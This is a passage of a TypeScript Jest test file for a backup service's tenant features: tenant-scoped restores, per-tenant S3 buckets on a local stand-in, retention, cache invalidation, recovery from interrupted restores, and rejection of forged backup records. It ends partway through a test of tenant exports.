import assert from 'node:assert';
import { execFileSync } from 'node:child_process';
import { Readable } from 'node:stream';
import { text } from 'node:stream/consumers';
import { pipeline } from 'node:stream/promises';

import { afterAll, beforeAll, describe, expect, it } from '@jest/globals';
import { first, firstValueFrom } from 'rxjs';
import { InMemoryDataSource } from 'zibri-testing';

import { BackupDigest } from './backup-digest.model';
import { BackupEncryptionUtilities } from './backup-encryption.utilities';
import { BackupEntity } from './backup-entity.model';
import { BACKUP_REPOSITORY_FOLDER } from './backup-format';
import { BackupResourceEntity } from './backup-resource-entity.model';
import { BackupServiceInterface } from './backup-service.interface';
import { BackupStatus } from './backup-status.enum';
import { Backup } from './decorators/backup-resource.decorator';
import { BackupTransport } from './decorators/backup-transport.decorator';
import { RestoreJournalUtilities } from './restore-journal.utilities';
import { StagedFile } from './staged-file.model';
import { StagingUtilities } from './staging.utilities';
import { S3TenantBackupTransportKind } from './tenant/s3.tenant-backup-transport-kind';
import { TenantBackupSettings } from './tenant/tenant-backup-settings.model';
import { TenantBackupTransport } from './tenant/tenant-backup-transport.model';
import { TenantExportFormat } from './tenant-export-format.type';
import { TenantRowsBackupResource } from './tenant-rows.backup-resource';
import { BackupTransportSessionInterface } from './transports/backup-transport-session.interface';
import { FsBackupTransport } from './transports/fs.backup-transport';
import { S3BackupTransport } from './transports/s3.backup-transport';
import { S3StandIn } from '../__testing__/backup/s3-stand-in.model';
import { testFileFolder, TestTimeouts } from '../__testing__/constants';
import { TestPermissions } from '../__testing__/mocks/entities/test-permissions.model';
import { TestRole } from '../__testing__/mocks/entities/test-role.entity';
import { defaultTestServerEntities, defaultTestServerRepositories } from '../__testing__/test-server/create-test-data-source.function';
import { defaultTestServerProviders } from '../__testing__/test-server/providers';
import { DefaultTestServerRoleRepository } from '../__testing__/test-server/role-repository';
import { StartedTestServer, startTestServer } from '../__testing__/test-server/start-test-server.function';
import { waitUntil } from '../__testing__/wait-until.function';
import { EncryptionServiceInterface } from '../auth/encryption/encryption-service.interface';
import { EncryptionService } from '../auth/encryption/encryption.service';
import { EncryptionString } from '../auth/encryption/encryption.utilities';
import { type HashString } from '../auth/hash/hash.utilities';
import { Permission } from '../auth/roles/permission.type';
import { WriteThroughReadThroughCache } from '../caching/cache/read-through/write-through-read-through.cache';
import { CacheInvalidation } from '../caching/cache-invalidation.model';
import { CacheRestoreTagUtilities } from '../caching/cache-restore-tag.utilities';
import { type CacheServiceInterface } from '../caching/cache-service.interface';
import { Cache } from '../caching/decorators/cache.decorator';
import { InMemoryCacheStore } from '../caching/store/in-memory.cache-store';
import { IsolationLevel, StartTransactionOptions } from '../data-source/data-sources/data-source.interface';
import { DataSource } from '../data-source/decorators/data-source.decorator';
import { Repository } from '../data-source/repository/repository';
import { RepositoryClass } from '../data-source/repository/repository-class.type';
import { Transaction } from '../data-source/transaction/transaction.model';
import { repositoryTokenFor } from '../di/decorators/inject-repository.decorator';
import { Inject } from '../di/decorators/inject.decorator';
import { ZIBRI_DI_TOKENS } from '../di/default/zibri-di-tokens.default';
import { inject } from '../di/inject.function';
import { defineProvider } from '../di/models/di-provider.model';
import { AnyObject } from '../entity/any-object.model';
import { BaseEntity } from '../entity/base-entity.model';
import { BaseTenantEntity } from '../entity/base-tenant-entity.model';
import { Entity } from '../entity/decorators/entity.decorator';
import { Property } from '../entity/decorators/property.decorator';
import { OmitClass } from '../entity/omit-class.model';
import { BadRequestError } from '../error-handling/errors/bad-request.error';
import { ConflictError } from '../error-handling/errors/conflict.error';
import { NotFoundError } from '../error-handling/errors/not-found.error';
import { type LoggerInterface } from '../logging/logger.interface';
import { type MetricsServiceInterface } from '../metrics/metrics-service.interface';
import { TenantServiceInterface } from '../tenancy/tenant-service.interface';
import { Newable } from '../types/newable.type';
import { FsPath, FsUtilities } from '../utilities/fs.utilities';
import { JsonUtilities } from '../utilities/json.utilities';
import { MetadataUtilities } from '../utilities/metadata.utilities';
import { UUIDUtilities } from '../utilities/uuid.utilities';

const backupFolder: FsPath = FsUtilities.getPath(testFileFolder, `backups-tenant-${UUIDUtilities.generate()}`);

const MIB: number = 1024 * 1024;

@Entity()
class TenantLabel extends BaseTenantEntity() {
    @Property.string()
    name!: string;

    @Property.manyToMany({ target: () => TenantProject, inverseSide: 'labels', joinTable: false })
    projects!: TenantProject[];
}

@Entity()
class TenantProject extends BaseTenantEntity() {
    @Property.string()
    name!: string;

    // bound to its row, so that it decrypts again only in the row it was written to
    @Property.string({ encryption: true })
    secret!: string;

    @Property.manyToMany({ target: () => TenantLabel, inverseSide: 'projects', joinTable: true })
    labels!: TenantLabel[];
}

@Entity()
class TenantTask extends BaseTenantEntity() {
    @Property.string()
    title!: string;

    @Property.string({ format: 'uuid' })
    projectId!: string;
}

/**
 * A member of a tenant, with what an export leaves out: a hashed value, and one excluded from what the
 * application answers.
 */
@Entity()
class TenantMember extends BaseTenantEntity() {
    @Property.string()
    name!: string;

    @Property.string({ hash: true, password: false })
    pin!: HashString;

    @Property.string({ exclude: true })
    internalNote!: string;
}

class TenantMemberCreateData extends OmitClass(TenantMember, ['id', 'tenantId', 'pin']) {
    @Property.string({ hash: true, password: false })
    pin!: string;
}

/**
 * What a tenant recorded, which a restore of the tenant keeps as it is.
 */
@Entity({ appendOnly: true })
class TenantActivity extends BaseTenantEntity() {
    @Property.string()
    what!: string;
}

/**
 * The names of the projects of the active tenant, cached, which a restore of the tenant makes stale.
 */
@Cache()
class TenantProjectNamesCache extends WriteThroughReadThroughCache<string, string[], 'TenantProjectNamesCache'> {
    constructor(
        @Inject(ZIBRI_DI_TOKENS.LOGGER)
        protected readonly logger: LoggerInterface,
        @Inject(ZIBRI_DI_TOKENS.CACHE_SERVICE)
        protected readonly cacheService: CacheServiceInterface,
        @Inject(ZIBRI_DI_TOKENS.METRICS_SERVICE)
        protected readonly metricsService: MetricsServiceInterface
    ) {
        super('TenantProjectNamesCache', new InMemoryCacheStore(), []);
    }
}

/**
 * How often the names were read from the data source rather than from the cache, by tenant, `''` outside
 * every tenant.
 */
const projectNameLoads: Map<string, number> = new Map();

/**
 * Reads the names of the projects of the active tenant through the cache, and of every tenant outside them.
 * @returns The names, sorted.
 */
async function readProjectNames(): Promise<string[]> {
    return await inject(TenantProjectNamesCache).wrap(
        async () => {
            const tenantId: string = inject(ZIBRI_DI_TOKENS.TENANT_SERVICE).getActiveTenantId() ?? '';
            projectNameLoads.set(tenantId, (projectNameLoads.get(tenantId) ?? 0) + 1);
            const projects: TenantProject[] = await inject(repositoryTokenFor(TenantProject)).findAll({ acrossTenants: tenantId === '', limit: 'all' });
            return projects.map(p => p.name).sort();
        },
        () => 'project-names'
    )();
}

/**
 * The encryption service, writing once as it decrypts when it is given something to write: what lands
 * between two reads of an export, after the rows it decrypts were read and before the next entity is.
 */
class WritingWhileDecryptingEncryptionService extends EncryptionService {
    /**
     * What to write the next time a value is decrypted, then never again.
     */
    writeOnce: (() => Promise<void>) | undefined;

    override async decrypt<TDecryptOptions extends AnyObject>(value: EncryptionString, options?: TDecryptOptions): Promise<string> {
        const write: (() => Promise<void>) | undefined = this.writeOnce;
        this.writeOnce = undefined;
        await write?.();
        return await super.decrypt(value, options);
    }
}

@BackupTransport()
class TenantFsBackupTransport extends FsBackupTransport {
    constructor() {
        super('tenant-fs-backup-transport', backupFolder);
    }
}

@DataSource()
@Backup({ transports: [TenantFsBackupTransport], encrypt: true })
class TenantBackupDataSource extends InMemoryDataSource {
    override readonly entities: Newable<BaseEntity>[] = [
        ...defaultTestServerEntities,
        BackupEntity,
        BackupResourceEntity,
        TenantLabel,
        TenantProject,
        TenantTask,
        TenantMember,
        TenantActivity,
        TenantBackupTransport,
        TenantBackupSettings
    ];

    override readonly repositories: RepositoryClass[] = defaultTestServerRepositories;

    /**
     * The transactions started reading as of one moment, as an export reads the data source.
     */
    readonly startedAsOfOneMoment: Transaction[] = [];

    override startTransaction(options?: StartTransactionOptions): Transaction {
        const transaction: Transaction = super.startTransaction(options);
        if (options?.isolationLevel === IsolationLevel.REPEATABLE_READ) {
            this.startedAsOfOneMoment.push(transaction);
        }
        return transaction;
    }
}

function getBackupService(): BackupServiceInterface {
    return inject(ZIBRI_DI_TOKENS.BACKUP_SERVICE);
}

async function asTenant<T>(tenantId: string, work: () => Promise<T>): Promise<T> {
    const tenants: TenantServiceInterface = inject(ZIBRI_DI_TOKENS.TENANT_SERVICE);
    return await tenants.runAs(tenantId, work);
}

/**
 * A bucket on the stand-in, in this process, which a tenant's backups go to.
 */
const standIn: S3StandIn = new S3StandIn(FsUtilities.getPath(testFileFolder, `backups-tenant-bucket-${UUIDUtilities.generate()}`));

/**
 * The tenants given a bucket so far.
 */
const withBucket: Set<string> = new Set();

/**
 * Gives a tenant a bucket of its own on the stand-in, once: a tenant backs up to its own transports alone.
 * @param tenantId - The tenant.
 */
async function giveBucket(tenantId: string): Promise<void> {
    if (withBucket.has(tenantId)) {
        return;
    }
    const create: BackupServiceInterface['createTenantBackupTransport'] = getBackupService().createTenantBackupTransport;
    assert(create, 'the backup service takes no transports of tenants');
    await create.call(getBackupService(), tenantId, {
        name: 'own bucket',
        kind: 's3',
        settings: { endpoint: standIn.getEndpoint(), bucket: 'tenant-backups', region: 'us-east-1', accessKeyId: 'tenant-key', addressingStyle: 'path' },
        secret: { secretAccessKey: 'tenant-secret' }
    });
    withBucket.add(tenantId);
}

/**
 * Takes a backup, and waits until the pass that stored it is over, retention included.
 * @param name - The name of the backup.
 * @param tenantId - The tenant to back up, or undefined for the application.
 * @returns The backup, completed.
 */
async function takeBackup(name: string, tenantId?: string): Promise<BackupEntity> {
    if (tenantId != undefined) {
        await giveBucket(tenantId);
    }
    const backup: BackupEntity = await getBackupService().waitForBackup(await getBackupService().queueBackup({ name, tenantId }));
    await firstValueFrom(getBackupService().isCreatingBackup.pipe(first(creating => !creating)));
    return backup;
}

/**
 * Forgets a backup in the database alone, as a database restored from a backup of the application has
 * forgotten it, while its transports still hold it.
 * @param backup - The backup.
 */
async function forgetRecorded(backup: BackupEntity): Promise<void> {
    await inject(repositoryTokenFor(BackupResourceEntity)).deleteAll({ backupId: backup.id });
    await inject(repositoryTokenFor(BackupEntity)).deleteById(backup.id);
}

function getSync(): NonNullable<BackupServiceInterface['syncTenantBackupEntities']> {
    const sync: BackupServiceInterface['syncTenantBackupEntities'] = getBackupService().syncTenantBackupEntities;
    assert(sync, 'the backup service syncs no backups of tenants');
    return sync;
}

/**
 * The bucket every tenant of the suite backs up to, reached past the service, as whoever owns it reaches it.
 * @returns The transport.
 */
function resolveBucket(): S3BackupTransport {
    return new S3BackupTransport('stand-in', {
        endpoint: standIn.getEndpoint(),
        bucket: 'tenant-backups',
        region: 'us-east-1',
        credentials: { accessKeyId: 'tenant-key', secretAccessKey: 'tenant-secret' },
        serverSideEncryption: 'bucket-default',
        addressingStyle: 'path'
    });
}

/**
 * What a tenant holds: its projects with their labels and secrets, its tasks and what it recorded.
 * @param tenantId - The tenant.
 * @returns What it holds, in a stable order.
 */
async function resolveHeld(tenantId: string): Promise<Record<string, unknown>> {
    return await asTenant(tenantId, async () => {
        const projects: Repository<TenantProject> = inject(repositoryTokenFor(TenantProject));
        const tasks: Repository<TenantTask> = inject(repositoryTokenFor(TenantTask));
        const activities: Repository<TenantActivity> = inject(repositoryTokenFor(TenantActivity));
        return {
            projects: (await projects.findAll({ relations: { labels: true }, limit: 'all' }))
                .map(p => ({ id: p.id, name: p.name, secret: p.secret, labels: p.labels.map(l => l.name).sort() }))
                .sort((a, b) => a.name.localeCompare(b.name)),
            tasks: (await tasks.findAll({ limit: 'all' })).map(t => t.title).sort(),
            activities: (await activities.findAll({ limit: 'all' })).map(a => a.what).sort()
        };
    });
}

describe('BackupService - a backup of a tenant', () => {
    let server: StartedTestServer | undefined;

    beforeAll(async () => {
        await FsUtilities.rm(backupFolder);
        await standIn.start();
        server = await startTestServer({
            dataSources: [TenantBackupDataSource],
            providers: [
                ...defaultTestServerProviders,
                defineProvider({ token: ZIBRI_DI_TOKENS.BACKUP_RETENTION, useValue: { timeZone: 'UTC', last: 1 } }),
                defineProvider({ token: ZIBRI_DI_TOKENS.ENCRYPTION_SERVICE, useClass: WritingWhileDecryptingEncryptionService }),
                // the stand-in answers over plain http on this machine
                defineProvider({
                    token: ZIBRI_DI_TOKENS.BACKUP_TENANT_TRANSPORT_OPTIONS,
                    useValue: { kinds: [new S3TenantBackupTransportKind()], allowedHosts: undefined, allowPrivateNetworks: true }
                })
            ]
        });
    }, TestTimeouts.inMemory.start);

    afterAll(async () => {
        await server?.shutdown();
        await standIn.stop();
        await FsUtilities.rm(backupFolder);
    }, TestTimeouts.inMemory.shutdown);

    it('replaces the rows of the tenant with the backup\'s, and leaves every other tenant and what was recorded as they are', async () => {
        const tenantA: string = UUIDUtilities.generate();
        const tenantB: string = UUIDUtilities.generate();
        await asTenant(tenantA, async () => {
            const labels: TenantLabel[] = await inject(repositoryTokenFor(TenantLabel)).createAll([{ name: 'urgent' }, { name: 'design' }]);
            const project: TenantProject = await inject(repositoryTokenFor(TenantProject)).create({ name: 'Website', secret: 'the key', labels });
            await inject(repositoryTokenFor(TenantTask)).createAll([{ title: 'Sketch', projectId: project.id }, { title: 'Build', projectId: project.id }]);
            await inject(repositoryTokenFor(TenantActivity)).create({ what: 'before the backup' });
        });
        await asTenant(tenantB, async () => await inject(repositoryTokenFor(TenantProject)).create({ name: 'Shop', secret: 'b', labels: [] }));
        const atBackup: Record<string, unknown> = await resolveHeld(tenantA);
        const backup: BackupEntity = await takeBackup('tenant-a', tenantA);

        await asTenant(tenantA, async () => {
            const projects: Repository<TenantProject> = inject(repositoryTokenFor(TenantProject));
            const [website] = await projects.findAll({ limit: 'all' });
            await projects.updateById(website?.id ?? '', { name: 'Website, renamed', labels: [] });
            await projects.create({ name: 'Created since', secret: 'new', labels: [] });
            await inject(repositoryTokenFor(TenantTask)).deleteAll({ title: 'Build' });
            await inject(repositoryTokenFor(TenantActivity)).create({ what: 'after the backup' });
        });
        await asTenant(tenantB, async () => await inject(repositoryTokenFor(TenantProject)).create({ name: 'Shop, again', secret: 'b2', labels: [] }));
        const otherTenant: Record<string, unknown> = await resolveHeld(tenantB);

        expect(backup.tenantId).toBe(tenantA);
        await getBackupService().restore(backup);

        const restored: Record<string, unknown> = await resolveHeld(tenantA);
        expect(restored['projects']).toStrictEqual(atBackup['projects']);
        expect(restored['tasks']).toStrictEqual(atBackup['tasks']);
        // what was recorded is kept, the record made since included
        expect(restored['activities']).toStrictEqual(['after the backup', 'before the backup']);
        expect(await resolveHeld(tenantB)).toStrictEqual(otherTenant);
    }, 30000);

    it('keeps the backups of the application apart from those of a tenant in the retention', async () => {
        const tenant: string = UUIDUtilities.generate();
        await takeBackup('application');
        await takeBackup('tenant, first', tenant);
        await takeBackup('tenant, second', tenant);

        const names: string[] = (await inject(repositoryTokenFor(BackupEntity)).findAll({ limit: 'all' })).map(b => b.name);
        expect(names).toContain('application');
        expect(names).toContain('tenant, second');
        expect(names).not.toContain('tenant, first');
    }, 30000);

    it('puts back the rows of the tenant alone, and no other tenant\'s, when a restore of it was interrupted', async () => {
        const tenantA: string = UUIDUtilities.generate();
        const tenantB: string = UUIDUtilities.generate();
        const create: (tenantId: string, name: string) => Promise<void> = async (tenantId, name) => await asTenant(tenantId, async () => {
            await inject(repositoryTokenFor(TenantProject)).create({ name, secret: name, labels: [] });
        });
        await create(tenantA, 'held before');
        await create(tenantB, 'of the other tenant');
        // what a process killed while replacing the tenant's rows leaves: the journal naming the tenant, and
        // the snapshot of its rows before
        const stagingFolder: FsPath = inject(ZIBRI_DI_TOKENS.BACKUP_TEMP_FOLDER);
        const snapshot: StagedFile = {
            path: FsUtilities.getPath(stagingFolder, `interrupted-${tenantA}-before`),
            compression: 'zstd',
            encryption: BackupEncryptionUtilities.generateStagedFileEncryption()
        };
        await FsUtilities.mkdir(stagingFolder);
        const snapshotDigest: BackupDigest = await StagingUtilities.stage(new TenantRowsBackupResource(inject(TenantBackupDataSource), tenantA).createBackupData(), snapshot);
        await RestoreJournalUtilities.write(RestoreJournalUtilities.getPath(stagingFolder, UUIDUtilities.generate()), {
            backupName: 'interrupted',
            tenantId: tenantA,
            applied: [await RestoreJournalUtilities.resolveEntry(TenantBackupDataSource.name, snapshot, snapshotDigest, inject(ZIBRI_DI_TOKENS.ENCRYPTION_SERVICE))]
        });
        await create(tenantA, 'written by the restore');
        await create(tenantB, 'written since, by the other tenant');

        await server?.reInit();

        expect((await resolveHeld(tenantA))['projects']).toStrictEqual([expect.objectContaining({ name: 'held before' })]);
        expect(((await resolveHeld(tenantB))['projects'] as { name: string }[]).map(p => p.name))
            .toStrictEqual(['of the other tenant', 'written since, by the other tenant']);
        // the other instances, whose caches may hold what the restore had written
        const published: CacheInvalidation[] = await inject(repositoryTokenFor(CacheInvalidation)).findAll({});
        expect(published.map(p => p.tags)).toContainEqual([CacheRestoreTagUtilities.getTenantTag(tenantA), CacheRestoreTagUtilities.UNTENANTED_TAG]);
    }, 60000);

    describe('the caches across a restore of a tenant', () => {
        it('reads again what the tenant cached and what was cached outside every tenant, and keeps what other tenants cached', async () => {
            const tenantA: string = UUIDUtilities.generate();
            const tenantB: string = UUIDUtilities.generate();
            await asTenant(tenantA, async () => await inject(repositoryTokenFor(TenantProject)).create({ name: 'Backed up', secret: 'a', labels: [] }));
            await asTenant(tenantB, async () => await inject(repositoryTokenFor(TenantProject)).create({ name: 'Of the other tenant', secret: 'b', labels: [] }));
            const backup: BackupEntity = await takeBackup('tenant-caches', tenantA);
            await asTenant(tenantA, async () => await inject(repositoryTokenFor(TenantProject)).create({ name: 'Created since', secret: 'a2', labels: [] }));
            expect(await asTenant(tenantA, readProjectNames)).toEqual(['Backed up', 'Created since']);
            await asTenant(tenantB, readProjectNames);
            const acrossTenants: string[] = await readProjectNames();
            expect(acrossTenants).toContain('Created since');
            const loadsBefore: number[] = [tenantA, tenantB, ''].map(t => projectNameLoads.get(t) ?? 0);

            await getBackupService().restore(backup);

            expect(await asTenant(tenantA, readProjectNames)).toEqual(['Backed up']);
            expect(await asTenant(tenantB, readProjectNames)).toEqual(['Of the other tenant']);
            expect(await readProjectNames()).not.toContain('Created since');
            assert(loadsBefore[0] != undefined && loadsBefore[2] != undefined);
            // the other tenant's from the cache
            expect([tenantA, tenantB, ''].map(t => projectNameLoads.get(t) ?? 0)).toEqual([loadsBefore[0] + 1, loadsBefore[1], loadsBefore[2] + 1]);
        }, 30000);

        it('tells every other instance to forget what the tenant cached once it is restored', async () => {
            const tenantId: string = UUIDUtilities.generate();
            const backup: BackupEntity = await takeBackup('tenant-caches-told', tenantId);

            await getBackupService().restore(backup);

            const published: CacheInvalidation[] = await inject(repositoryTokenFor(CacheInvalidation)).findAll({});
            expect(published.map(p => p.tags)).toContainEqual([CacheRestoreTagUtilities.getTenantTag(tenantId), CacheRestoreTagUtilities.UNTENANTED_TAG]);
        }, 30000);

        it('checks the roles of the tenant\'s own as the restore wrote them', async () => {
            const tenantId: string = UUIDUtilities.generate();
            const roles: DefaultTestServerRoleRepository = inject(DefaultTestServerRoleRepository);
            const reviewer: TestRole = await asTenant(tenantId, async () => await roles.create({
                name: 'reviewer',
                level: 'tenant',
                permissions: [TestPermissions.MEMBER_USER],
                tenantId,
                description: undefined
            }));
            const backup: BackupEntity = await takeBackup('tenant-roles', tenantId);
            await asTenant(tenantId, async () => await roles.updateById(reviewer.id, { permissions: [TestPermissions.MEMBER_USER, TestPermissions.MEMBER_ADMIN] }));
            const granted: Permission[] = await inject(ZIBRI_DI_TOKENS.ROLE_SERVICE).resolvePermissionsOf(['reviewer'], tenantId);
            expect(granted.sort()).toEqual([TestPermissions.MEMBER_ADMIN, TestPermissions.MEMBER_USER].sort());

            await getBackupService().restore(backup);

            expect(await inject(ZIBRI_DI_TOKENS.ROLE_SERVICE).resolvePermissionsOf(['reviewer'], tenantId)).toEqual([TestPermissions.MEMBER_USER]);
        }, 30000);
    });

    it('refuses a tenant that is no uuid', async () => {
        await expect(getBackupService().queueBackup({ name: 'no-uuid', tenantId: 'acme' })).rejects.toThrow(BadRequestError);
        expect(() => getBackupService().exportTenant?.('acme', 'csv')).toThrow(BadRequestError);
    });

    describe('the transports of a tenant', () => {
        it('stores the tenant\'s backup on its own bucket alone', async () => {
            const tenant: string = UUIDUtilities.generate();
            const backup: BackupEntity = await takeBackup('on its own bucket', tenant);

            const [transport] = await getBackupService().findTenantBackupTransports?.(tenant) ?? [];
            expect(backup.resources.map(r => r.transportNames)).toStrictEqual([[`tenant-transport:${transport?.id}`]]);
        }, 30000);

        it('keeps a transport while a backup is stored on it, and deletes it once none is', async () => {
            const tenant: string = UUIDUtilities.generate();
            const backup: BackupEntity = await takeBackup('keeps its transport', tenant);
            const [transport] = await getBackupService().findTenantBackupTransports?.(tenant) ?? [];
            const remove: BackupServiceInterface['deleteTenantBackupTransport'] = getBackupService().deleteTenantBackupTransport;
            assert(transport && remove, 'the tenant has no transport, or the backup service deletes none');

            await expect(remove.call(getBackupService(), tenant, transport.id)).rejects.toThrow(ConflictError);
            await getBackupService().delete(backup);
            await remove.call(getBackupService(), tenant, transport.id);
            expect(await getBackupService().findTenantBackupTransports?.(tenant)).toStrictEqual([]);
        }, 30000);

        it('records the backups of a tenant again from its own transport once the database lost them', async () => {
            const tenant: string = UUIDUtilities.generate();
            const backup: BackupEntity = await takeBackup('lost with the database', tenant);
            await forgetRecorded(backup);

            await getSync().call(getBackupService(), tenant);

            const recorded: BackupEntity = await inject(repositoryTokenFor(BackupEntity)).findById(backup.id, { relations: ['resources'] });
            expect(recorded.tenantId).toBe(tenant);
            expect(recorded.status).toBe(BackupStatus.COMPLETED);
            expect(recorded.resources.map(r => r.checksum)).toStrictEqual(backup.resources.map(r => r.checksum));
            await getBackupService().restore(recorded);
        }, 30000);

        it('records the backups of every tenant again as garbage is collected, and collects the garbage of their transports', async () => {
            const tenant: string = UUIDUtilities.generate();
            const backup: BackupEntity = await takeBackup('lost before a collection', tenant);
            await forgetRecorded(backup);
            const collectGarbage: BackupServiceInterface['collectGarbage'] = getBackupService().collectGarbage;
            assert(collectGarbage, 'the backup service collects no garbage');

            await collectGarbage.call(getBackupService());

            expect((await inject(repositoryTokenFor(BackupEntity)).findById(backup.id)).tenantId).toBe(tenant);
        }, 30000);

        it('records the backups on a transport no recorded backup names as the application starts', async () => {
            const tenant: string = UUIDUtilities.generate();
            const backup: BackupEntity = await takeBackup('lost before a start', tenant);
            await forgetRecorded(backup);

            await server?.reInit();

            // in the background, so that a slow transport of a tenant does not hold back the start
            await waitUntil(async () => (await inject(repositoryTokenFor(BackupEntity)).findAll({ where: { id: backup.id }, limit: 'all' })).length > 0, 10000);
            expect((await inject(repositoryTokenFor(BackupEntity)).findById(backup.id)).tenantId).toBe(tenant);
        }, 60000);

        it('skips a record on a tenant\'s transport of another tenant\'s backup, or of one on transports not the tenant\'s', async () => {
            const owner: string = UUIDUtilities.generate();
            const other: string = UUIDUtilities.generate();
            const backup: BackupEntity = await takeBackup('genuine', owner);
            const [ownTransport] = await getBackupService().findTenantBackupTransports?.(owner) ?? [];
            assert(ownTransport, 'the tenant has no transport');
            const session: BackupTransportSessionInterface = await resolveBucket().openSession();
            const planted: string[] = [UUIDUtilities.generate(), UUIDUtilities.generate()];
            try {
                const genuine: BackupEntity = JsonUtilities.parse<BackupEntity>(
                    await text(await session.get(`${BACKUP_REPOSITORY_FOLDER}/backups/${backup.id}/record.json`, MIB))
                );
                const [ofOtherTenant, onOtherTransports] = planted;
                assert(ofOtherTenant != undefined && onOtherTransports != undefined, 'nothing planted');
                await session.put(`${BACKUP_REPOSITORY_FOLDER}/backups/${ofOtherTenant}/record.json`, Readable.from([
                    Buffer.from(
                        JsonUtilities.stringify({ ...genuine, id: ofOtherTenant, tenantId: other })
                    )
                ]));
                await session.put(`${BACKUP_REPOSITORY_FOLDER}/backups/${onOtherTransports}/record.json`, Readable.from([
                    Buffer.from(
                        JsonUtilities.stringify({
                            ...genuine,
                            id: onOtherTransports,
                            resources: genuine.resources.map(r => ({ ...r, transportNames: [...r.transportNames, 'tenant-transport:of-someone-else'] }))
                        })
                    )
                ]));
            }
            finally {
                await session.close();
            }

            await getSync().call(getBackupService(), owner);

            const recorded: string[] = (await inject(repositoryTokenFor(BackupEntity)).findAll({ limit: 'all' })).map(b => b.id);
            expect(recorded).toContain(backup.id);
            expect(recorded.filter(id => planted.includes(id))).toStrictEqual([]);
            // gone again, so that no other case finds a record it cannot account for
            const cleanup: BackupTransportSessionInterface = await resolveBucket().openSession();
            try {
                await cleanup.delete(planted.map(id => `${BACKUP_REPOSITORY_FOLDER}/backups/${id}/record.json`));
            }
            finally {
                await cleanup.close();
            }
        }, 30000);

        it('refuses to delete the transport of another tenant without naming the backups stored on it', async () => {
            const owner: string = UUIDUtilities.generate();
            const other: string = UUIDUtilities.generate();
            const backup: BackupEntity = await takeBackup('on the owner\'s transport', owner);
            const [transport] = await getBackupService().findTenantBackupTransports?.(owner) ?? [];
            const remove: BackupServiceInterface['deleteTenantBackupTransport'] = getBackupService().deleteTenantBackupTransport;
            assert(transport && remove, 'the tenant has no transport, or the backup service deletes none');

            const refused: Promise<void> = remove.call(getBackupService(), other, transport.id);

            await expect(refused).rejects.toThrow(NotFoundError);
            await expect(refused).rejects.not.toThrow(backup.name);
            expect(await getBackupService().findTenantBackupTransports?.(owner)).toHaveLength(1);
        }, 30000);

        it('keeps the backups of a tenant by the retention it set, apart from the application\'s', async () => {
            const tenant: string = UUIDUtilities.generate();
            const setRetention: BackupServiceInterface['setTenantBackupRetention'] = getBackupService().setTenantBackupRetention;
            assert(setRetention, 'the backup service keeps no retention of tenants');
            await setRetention.call(getBackupService(), tenant, { timeZone: 'UTC', last: 2 });
            for (const name of ['kept by the tenant, first', 'kept by the tenant, second', 'kept by the tenant, third']) {
                await takeBackup(name, tenant);
            }

            const names: string[] = (await inject(repositoryTokenFor(BackupEntity)).findAll({ where: { tenantId: tenant }, limit: 'all' })).map(b => b.name).sort();
            expect(names).toStrictEqual(['kept by the tenant, second', 'kept by the tenant, third']);
        }, 30000);
    });

    describe('an export of a tenant', () => {
        const tenantA: string = UUIDUtilities.generate();
        const tenantB: string = UUIDUtilities.generate();
        const table: (entity: Newable<BaseEntity>) => string = entity => MetadataUtilities.getEntityMetadata(entity)?.tableName ?? '';
        // in the folder of the data source the rows were read from
        const file: (entity: Newable<BaseEntity>, extension: string) => string = (entity, extension) => `${TenantBackupDataSource.name}/${table(entity)}.${extension}`;

        /**
         * Exports a tenant and unpacks the archive with the system's tar, as whoever it is handed to would.
         * @param format - How the rows are written.
         * @returns The folder it was unpacked into.
         */
        async function exportAndUnpack(format: TenantExportFormat): Promise<FsPath> {
            const exportTenant: BackupServiceInterface['exportTenant'] = getBackupService().exportTenant;
            assert(exportTenant, 'the backup service exports no tenant');
            const folder: FsPath = FsUtilities.getPath(backupFolder, `export-${format}-${UUIDUtilities.generate()}`);
            await FsUtilities.mkdir(folder);
            const archive: FsPath = FsUtilities.getPath(folder, 'export.tar');
            await pipeline(await exportTenant.call(getBackupService(), tenantA, format), FsUtilities.createWriteStream(archive));
            execFileSync('tar', ['-xf', archive, '-C', folder]);
            return folder;
        }

        beforeAll(async () => {
            await asTenant(tenantA, async () => {
                const labels: TenantLabel[] = await inject(repositoryTokenFor(TenantLabel)).createAll([{ name: 'urgent' }]);
                await inject(repositoryTokenFor(TenantProject)).create({ name: 'Website, "new"', secret: 'decrypted\nacross lines', labels });
                const members: Repository<TenantMember, TenantMemberCreateData> = inject(repositoryTokenFor(TenantMember));
                await members.create({ name: 'Ada', pin: '1234', internalNote: 'kept on the server' });
            });
            await asTenant(tenantB, async () => await inject(repositoryTokenFor(TenantProject)).create({ name: 'Shop', secret: 'b', labels: [] }));
        });

        it('holds the rows of the tenant as the application answers them, a JSON object per line', async () => {
            const folder: FsPath = await exportAndUnpack('json-lines');

            const manifest: { tenantId: string, files: { dataSource: string, entity: string, file: string, rows: number }[] } = JsonUtilities.parse(
                await FsUtilities.readFile(FsUtilities.getPath(folder, 'manifest.json'))
            );
            expect(manifest.tenantId).toBe(tenantA);
            expect(manifest.files).toContainEqual({ dataSource: TenantBackupDataSource.name, entity: table(TenantProject), file: file(TenantProject, 'jsonl'), rows: 1 });
            const lines: (name: string) => Promise<Record<string, unknown>[]> = async name => (await FsUtilities.readFile(FsUtilities.getPath(folder, name)))
                .split('\n').filter(l => l.length)
                .map(l => JsonUtilities.parse<Record<string, unknown>>(l));
            const [project, ...otherProjects] = await lines(file(TenantProject, 'jsonl'));
            // the other tenant's project in a file of its own tenant only
            expect(otherProjects).toStrictEqual([]);
            expect(project).toMatchObject({ name: 'Website, "new"', secret: 'decrypted\nacross lines', tenantId: tenantA });
            expect(project?.['labels']).toHaveLength(1);
            const [member] = await lines(file(TenantMember, 'jsonl'));
            expect(member).toMatchObject({ name: 'Ada' });
            expect(Object.keys(member ?? {})).not.toContain('pin');
            expect(Object.keys(member ?? {})).not.toContain('internalNote');
        }, 30000);

        // read one entity after another, a task written while the projects were read was in the export
        // without the project it belongs to
        it('reads the tenant as of one moment: a row written while it is read is in it with the rows it points at, or not at all', async () => {
            const encryption: EncryptionServiceInterface = inject(ZIBRI_DI_TOKENS.ENCRYPTION_SERVICE);
            assert(encryption instanceof WritingWhileDecryptingEncryptionService, 'the encryption service writes nothing while it decrypts');
            let written: boolean = false;
            // as the projects are read, which decrypts their secrets, and before the tasks are
            encryption.writeOnce = async () => {
                await asTenant(tenantA, async () => {
                    const project: TenantProject = await inject(repositoryTokenFor(TenantProject)).create({ name: 'written meanwhile', secret: 's', labels: [] });
